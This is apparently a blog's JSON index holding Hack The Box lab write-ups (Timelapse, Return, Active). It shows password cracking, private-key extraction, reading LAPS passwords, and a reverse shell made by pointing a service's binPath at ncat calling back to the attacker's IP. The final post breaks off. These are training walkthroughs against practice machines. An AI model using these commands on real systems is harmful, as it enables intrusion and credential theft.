hash some files regarding LAPS.smb: \\Dev\\&gt; dir . D 0 Tue Oct 26 01:25:06 2021 .. D 0 Tue Oct 26 01:25:06 2021 winrm_backup.zip A 2611 Mon Oct 25 21:31:42 2021smb: \\Dev\\&gt; get winrm_backup.zipgetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (8.1 KiloBytes/sec) (average 8.1 KiloBytes/sec)smb: \\&gt; cd HelpDesksmb: \\HelpDesk\\&gt; dir . D 0 Mon Oct 25 21:33:42 2021 .. D 0 Mon Oct 25 21:33:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 20:42:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 20:42:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 20:42:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 20:42:44 2021ABOUT LAPSThe “Local Administrator Password Solution” (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.ZIP FILE CRACKINGWhile trying to unzip the winrm_backup.zip file it turns out to be password protected so we will use fcrackzip utility to crack the zip file password using rockyou.txt wordlist.$unzip winrm_backup.zip Archive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: skipping: legacyy_dev_auth.pfx incorrect passwordfcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zipPASSWORD FOUND!!!!: pw == supremelegacyWe found the password as supremelegacy. we will now unzip using this password.unzip winrm_backup.zipArchive: winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: legacyy_dev_auth.pfxTheres a file legacyy_dev_auth.pfx in the zip archive.ABOUT PFX FILE EXTENSIONA .pfx file is a digital certificate file that is used to authenticate a user or device. It contains the private key and public key for the certificate, as well as any intermediate certificates that are required for trust. PFX files are typically used for secure web connections, email signing and encryption, and other secure communicationsUsing openssl to extract the key and certificate from the .pfx file, it appears to require a password.$openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key -nodesEnter Import Password:PFX2JOHNpfx2john.py will generate hash for this, and we can use john to crack the hash.$sudo python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx &gt; pfx.hashJOHN$john pfx.hash -w=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 512/512 AVX512BW 16x])Cost 1 (iteration count) is 2000 for all loaded hashesCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusthuglegacy (legacyy_dev_auth.pfx)1g 0:00:00:49 DONE (2023-01-26 23:00) 0.02010g/s 64972p/s 64972c/s 64972C/s thuglife06..thsco04Use the \"--show\" option to display all of the cracked passwords reliablySession completed $john --show pfx.hash legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx 1 password hash cracked, 0 leftEXTRACTING KEYSUsing thuglegacy as password we can now extract key and cert.$openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key -nodes Enter Import Password:$openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.crtEnter Import Password:$cat legacyy_dev_auth.keyBag Attributes Microsoft Local Key set: &lt;No Values&gt; localKeyID: 01 00 00 00 friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b Microsoft CSP Name: Microsoft Software Key Storage ProviderKey Attributes X509v3 Key Usage: 90-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClVgejYhZHHuLzTSOtYXHOi56zSocr9om854YDu/6qHBa4Nf8xFP6INNBNlYWvAxCvKM8aQsHpv3topwpQ+YbRZDu1NxyhvfNNTRXjdFQV9nIiKkowOt6gG2F+9O5gVF4PAnHPm+YYPwsboRkYV8QOpzIi6NMZgDCJrgISWZmUHqThybFW/7POme1gs6tiN1XFoPu1zNOYaIL3dtZaazXcLw6IpTJRPJAWGttqyFommYrJqCzCSaWu9jG0p1hKK7mk6wvBSR8QfHW2qX9+NbLKegCt+/jAa6u2V9lu+K3MC2NaSzOoIi5HLMjnrujRoCx3v6ZXL0KPCFzDMEqLFJHxAgMBAAECggEAc1JeYYe5IkJY6nuTtwuQ5hBc0ZHaVr/PswOKZnBqYRzWfAatyP5ry3WLFZKFfF0W9hXw3tBRkUkOOyDIAVMKxmKzguK+BdMIMZLjAZPSUr9jPJFizeFCB0sR5gvReT9fm/iIidaj16WhidQEPQZ6qf3U6qSbGd5f/KhyqXn1tWnLGNdwA0ZBYBRaURBOqEIFmpHbuWZCdis20CvzsLB+Q8LClVz4UkmPX1RTFnHTxJW0Aos+JHMBRuLw57878BCdjL6DYYhdR4kiLlxLVbyXrP+4w8dOurRgxdYQ6iyL4UmUIfvrqu8aUdTykJOVv6wWaw5xxH8A31nl/hWt50vEQQKBgQDYcwQvXaezwxnzu+zJ7BtdnN6DJVthEQ+9jquVUbZWlAI/g2MKtkKkkD9rWZAK6u3LwGmDDCUrcHQBD0h7tykwN9JTJhuXkkiS1eS3BiAumMrnKFM+wPodXi1+4wJk3YTWKPKLXo71KbLo+5NJ2LUmvvPDyITQjsoZoGxLDZvLFwKBgQDDjA7YHQ+S3wYk+11q9M5iRR9bBXSbUZja8LVecW5FDH4iTqWg7xq0uYnLZ01mIswiil53+5Rch5opDzFSaHeS2XNPf/Y//TnV1+gIb3AICcTAb4bAngau5zm6VSNpYXUjThvrLv3poXezFtCWLEBKrWOxWRP4JegIZnD1BfmQNwKBgEJYPtgl5Nl829+Roqrh7CFti+a29KN0D1cS/BTwzusKwwWkyB7obtTyQf4tnbE7AViKycyZVGtUNLp+bME/Cyj0c0t5SsvS0tvvJAPVpNejjc381kdN71xBGcDi5ED2hVj/hBikCz2qYmR3eFYSTrRpo15HgC5NFjV0rrzyluZRAoGAL7s3QF9Plt0jhdFpixr4aZpPvgsF3Ie9VOveiZAMh4Q2Ia+q1C6pCSYk0WaEyQKDa4b06jqZi0B6S71un5vqXAkCEYy9kf8AqAcMl0qEQSIJSaOvc8LfBMBiIe54N1fXnOeK/ww4ZFfKfQd7oLxqcRADvp1st2yhR7OhrN1pfl8CgYEAsJNjb8LdoSZKJZc0/F/rc2gFFK+MMnFncM752xpEtbUrtEULAKkhVMh6mAywIUWaYvpmbHDMPDIGqV7at2+XTTu+fiiJkAr+eTa/Sg3qLEOYgU0cSgWuZI0im3abbDtGlRt2Wga0/Igw9Ewzupc8A5ZZvI+GsHhm0Oab7PEWlRY=-----END PRIVATE KEY-----$cat legacyy_dev_auth.crtBag Attributes localKeyID: 01 00 00 00subject=CN = Legacyyissuer=CN = Legacyy-----BEGIN CERTIFICATE-----MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADASMRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og00E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAbYX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcsyOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AXDBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYerC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqam966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F03KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txGhqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbhnx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA-----END CERTIFICATE-----SHELL AS LEGACYwe can now use evil-winrm to spawn a shell using above cert and key. Since nmap shows port 5986 open , we need to use -S for the SSL connection.$evil-winrm -S -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -i 10.10.11.152*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoamitimelapse\\legacyySHELL AS SVC_DEPLOYENUMERATION*Evil-WinRM* PS C:\\Users\\legacyy&gt; net user legacyyUser name legacyyFull Name LegacyyCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 10/23/2021 11:17:10 AMPassword expires NeverPassword changeable 10/24/2021 11:17:10 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 1/28/2023 4:18:04 AMLogon hours allowed AllLocal Group Memberships *Remote Management UseGlobal Group memberships *Domain Users *DevelopmentThe command completed successfully.No interesting privileges here.*Evil-WinRM* PS C:\\Users\\legacyy&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledPOWERSHELL HISTORYFound a new user svc_deploy and it’s credential E3R$Q62^12p7PLlC%KWaxuaV*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadLine&gt; type ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitwe are now logged in as svc_deploy$evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -SEvil-WinRM shell v3.4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt;SHELL AS ROOTENUMERATIONsvc_deploy user is a member of LAPS_Readers and has access to read from LAPS.*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; net user svc_deployUser name svc_deployFull Name svc_deployCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 10/25/2021 11:12:37 AMPassword expires NeverPassword changeable 10/26/2021 11:12:37 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 1/28/2023 3:28:06 AMLogon hours allowed AllLocal Group Memberships *Remote Management UseGlobal Group memberships *LAPS_Readers *Domain UsersThe command completed successfully.No interesting privileges for svc_deploy user as well.*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledREAD PASSWORDTo read the LAPS password, we need to use Get-ADComputer and request the ms-mcs-admpwd property.*Evil-WinRM* PS C:\\Users\\svc_deploy\\Documents&gt; Get-ADComputer DC01 -property 'ms-mcs-admpwd'DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htbDNSHostName : dc01.timelapse.htbEnabled : Truems-mcs-admpwd : HQ[s0h+717F6CR.)b+7)mm4aName : DC01ObjectClass : computerObjectGUID : 6e10b102-6936-41aa-bb98-bed624c9b98fSamAccountName : DC01$SID : S-1-5-21-671920749-559770252-3318990721-1000UserPrincipalName :Using evil-winrm to get administrator shell.$evil-winrm -i timelapse.htb -S -u administrator -p \"HQ[s0h+717F6CR.)b+7)mm4a\"Evil-WinRM shell v3.4Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoamitimelapse\\administratorReference:https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-filehttps://www.hackingarticles.in/credential-dumpinglaps/" }, { "title": "Hack The Box - Return", "url": "/posts/Hack-The-Box-Return/", "categories": "hackthebox", "tags": "windows, active directory, robocopy, server operator, SeBackupPrivilege, SeRestorePrivilege, easy", "date": "2023-01-28 00:00:00 -0500", "snippet": "Return was an easy box that involved exploiting a printer’s web administration panel to obtain LDAP credentials.These credentials can then be used to access WinRM. The account obtained through this...", "content": "Return was an easy box that involved exploiting a printer’s web administration panel to obtain LDAP credentials.These credentials can then be used to access WinRM. The account obtained through this method is part of the Server Operators group,which gives it the ability to control and manipulate services. This privilege will be used to gain a shell with SYSTEM level accessRECONNMAPNmap shows multiple ports open.Snmap -p- --min-rate 10000 -oN return.nmap 10.10.11.108 Nmap scan report for 10.10.11.108 Host is up (0.075s latency). Not shown: 65510 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49668/tcp open unknown 49671/tcp open unknown 49674/tcp open unknown 49675/tcp open unknown 49679/tcp open unknown 49682/tcp open unknown 49694/tcp open unknown # Nmap done at Sat Jan 28 11:34:27 2023 -- 1 IP address (1 host up) scanned in 9.47 seconds$nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49679,49682,49694 -sC -sV 10.10.11.108 -oN tcp-service-return.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 11:41 +0545 Nmap scan report for 10.10.11.108 Host is up (0.074s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: HTB Printer Admin Panel | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-28 06:15:02Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 49694/tcp open msrpc Microsoft Windows RPC Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: 17m55s | smb2-time: | date: 2023-01-28T06:15:58 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 73.76 secondsPORT 80Since port is open, when we try to access the site via a browser the site is displayed as “HTB Printer Admin Panel”On navigating to the settings pageThe above settings shows us the username which is svc-printer and the hardcoded password which has been masked.SHELL AS SVC-PRINTERCREDENTIAL DUMPINGOnce we change the server ip address to our ip address , open a netcat listener on port 389 and click on update .we receive a password 1edFg43012!!$sudo nc -lvnp 389listening on [any] 389 ...connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 608880*`%return\\svc-printer▒1edFg43012!!Using evil-winrm to establish a remote connection.$evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'Evil-WinRM shell v3.4Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; whoamireturn\\svc-printerSHELL AS ADMINISTRATORENUMERATION*Evil-WinRM* PS C:\\Users\\svc-printer&gt; net user svc-printerUser name svc-printerFull Name SVCPrinterComment Service Account for PrinterUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 5/26/2021 12:15:13 AMPassword expires NeverPassword changeable 5/27/2021 12:15:13 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 1/28/2023 4:56:36 AMLogon hours allowed AllLocal Group Memberships *Print Operators *Remote Management Use *Server OperatorsGlobal Group memberships *Domain UsersThe command completed successfully.Here, we can see that svc-printer is a member of Server Operators group which seems interesting.SERVER OPERATOR In Windows, the “Server Operators” group is a built-in security group that allows members to perform a limited set of administrativetasks on a server.By default, the group has no members. Server Operators can log on to a server interactively; create and delete networkshares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.PRIVILEGESsvc-printer does have quite interesting privileges which can lead us to system.*Evil-WinRM* PS C:\\Users\\svc-printer&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= =================================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemtimePrivilege Change the system time EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone EnabledMETHOD 1 - REPLACING SERVICE BINARY PATHENUMERATING INSTALLED SERVICESwe found a list of installed services and their path along with true/false flags for privileges.*Evil-WinRM* PS C:\\Users\\svc-printer&gt; servicesPath Privileges Service---- ---------- -------C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe True ADWS\\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{5533AFC7-64B3-4F6E-B453-E35320B35716}\\MpKslDrv.sys True MpKslceeb2796C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe True NetTcpPortSharingC:\\Windows\\SysWow64\\perfhost.exe True PerfHost\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe\" False SenseC:\\Windows\\servicing\\TrustedInstaller.exe False TrustedInstaller\"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" True VGAuthService\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" True VMTools\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe\" True WdNisSvc\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe\" True WinDefend\"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\" False WMPNetworkSvcSince, svc-printer is a member of server operator group. we can change the binary path of service, replace it with a netcat binary and restart the service to get the reverse shell.First we will upload ncat.exe*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; upload ncat.exeInfo: Upload successful!We will now repalce the binary path of VMTools service with our ncat.exe*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe config VMTools binPath=\"C:\\Users\\svc-printer\\Desktop\\ncat.exe -e cmd.exe 10.10.14.11 4444\"[SC] ChangeServiceConfig SUCCESSonce we open netcat listener on our machine and restart the service of VMTools we get shell as a Administrator.*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe start VMTools$sudo nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 60966Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemwe have got the shell as administrator but after 30 seconds, the service times out, and returns an error message and the shell terminates.STABLE SHELL AS ADMINISTRATOR If we have the service binary set to cmd.exe and have it start ncat.exe,the ncat.exe process will continue running even after cmd.exe is killed.This is because when cmd.exe starts ncat.exe, it creates a new process that is separate from the cmd.exe process. When the service fails to start in a service way,the cmd.exe process is killed but the ncat.exe process is still running as it was started by cmd.exe process, it is not dependent on it.*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe config VMTools binPath=\"C:\\windows\\system32\\cmd.exe /c C:\\Users\\svc-printer\\Desktop\\ncat.exe -e cmd 10.10.14.11[SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc stop VMTools*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; sc.exe start VMToolsnc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 61106Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\systemMETHOD 2: FILE READSince svc-printer has both SeBackupPrivilege and SeRestorePrivilege privilege we can use robocopy to read files. Non-admin user can use Robocopy to copy files and directories that are normally only accessible by administrators, if they are granted the SeBackupPrivilege and SeRestorePrivilege.The easiest way is to use the /B option to run Robocopy in “backup mode” which tells Robocopy to use the Volume Shadow Copy Service (VSS) to create a shadow copy of the volume being copied, and thus allows Robocopy to access files that are otherwise locked or in use*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; robocopy /b C:\\users\\administrator\\desktop C:\\programdata\\temp------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows------------------------------------------------------------------------------- Started : Saturday, January 28, 2023 8:45:40 AM Source : C:\\users\\administrator\\desktop\\ Dest : C:\\programdata\\temp\\ Files : *.* Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30------------------------------------------------------------------------------ 2 C:\\users\\administrator\\desktop\\ New File 34 root.txt 0%100%------------------------------------------------------------------------------ Total Copied Skipped Mismatch FAILED Extras Dirs : 1 0 1 0 0 0 Files : 2 1 1 0 0 0 Bytes : 316 34 282 0 0 0 Times : 0:00:00 0:00:00 00:00:00 0:00:00 Ended : Saturday, January 28, 2023 8:45:40 AM*Evil-WinRM* PS C:\\Users\\svc-printer\\Desktop&gt; cd C:\\programdata\\temp*Evil-WinRM* PS C:\\programdata\\temp&gt; dir Directory: C:\\programdata\\tempMode LastWriteTime Length Name---- ------------- ------ -----ar--- 1/27/2023 10:06 PM 34 root.txtnow we can read the root file*Evil-WinRM* PS C:\\programdata\\temp&gt; type root.txt3a8e0ddbc41e01511f43c310d8fd6eca" }, { "title": "Hack The Box - Active", "url": "/posts/Hack-The-Box-Active/", "categories": "hackthebox", "tags": "windows, smbmap, active directory, kerberoasting, smbclient, easy", "date": "2023-01-18 00:00:00 -0500", "snippet": "RECONNMAPStarting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1.$sudo nmap -sT -p- -oA alltcp 10.10.10.100S...", "content": "RECONNMAPStarting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1.$sudo nmap -sT -p- -oA alltcp 10.10.10.100Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 20:53 +0545Nmap scan report for 10.10.10.100Host is up (0.082s latency).Not shown: 65512 closed tcp ports (conn-refused)PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5722/tcp open msdfsr9389/tcp open adws47001/tcp open winrm49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49157/tcp open unknown49158/tcp open unknown49165/tcp open unknown49170/tcp open unknown49171/tcp open unknown$sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49171 10.10.10.100 -oN active-tcp-service.nmapStarting Nmap 7.92 ( https://nmap.org ) at 2023-01-17 21:05 +0545Nmap scan report for 10.10.10.100Host is up (0.084s latency).PORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid:|_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-01-17 15:20:27Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49165/tcp open msrpc Microsoft Windows RPC49170/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 2.1:|_ Message signing enabled and required| smb2-time:| date: 2023-01-17T15:21:23|_ start_date: 2023-01-17T14:52:45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 72.46 secondsSMB - 445Smbmap shows we have read access on Replicaiton share.$smbmap -H 10.10.10.100[+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY SYSVOL NO ACCESS Logon server share Users NO ACCESSREPLICATION SHARESince we can read replication share without password, we’ll use smbclient to enumerate through the share. There’s a intresting file Groups.xml we’ll download it and have a look.smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\&gt; cd Groups\\smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&gt; dir . D 0 Sat Jul 21 16:22:44 2018 .. D 0 Sat Jul 21 16:22:44 2018 Groups.xml A 533 Thu Jul 19 02:31:06 2018 5217023 blocks of size 4096. 284105 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&gt; get Groups.xmlgetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Groups.xml (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)Theres a username and cpassword.$cat Groups.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" 